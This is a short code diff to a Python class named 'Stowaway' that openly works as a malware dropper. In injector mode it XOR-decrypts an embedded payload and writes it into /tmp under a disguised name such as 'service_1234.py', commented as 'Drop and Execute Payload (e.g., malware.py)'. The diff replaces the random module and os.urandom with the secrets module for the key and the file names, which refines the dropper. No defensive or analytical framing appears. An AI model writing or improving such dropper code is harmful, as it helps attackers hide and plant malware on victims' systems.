@@ -9,7 +9,7 @@ Self-contained, encrypted body.
 import os
 import sys
 import time
-import random
+import secrets
 import base64
 import json
 import subprocess
@@ -22,7 +22,7 @@ class Stowaway:
     def __init__(self, mode="INJECTOR", target_dir="/tmp", payload_path=None):
         self.mode = mode
         self.target_dir = target_dir
-        self.key = os.urandom(16)
+        self.key = secrets.token_bytes(16)
         self.body = b""
 
         # Load payload if Injector
@@ -59,7 +59,7 @@ class Stowaway:
                 payload_code = xor_crypt(body_enc, key)
 
                 # Drop and Execute Payload (e.g., malware.py)
-                malware_path = os.path.join(target_dir, f"service_{random.randint(1000,9999)}.py")
+                malware_path = os.path.join(target_dir, f"service_{1000 + secrets.randbelow(9000)}.py")
                 with open(malware_path, 'wb') as f:
                     f.write(payload_code)
 
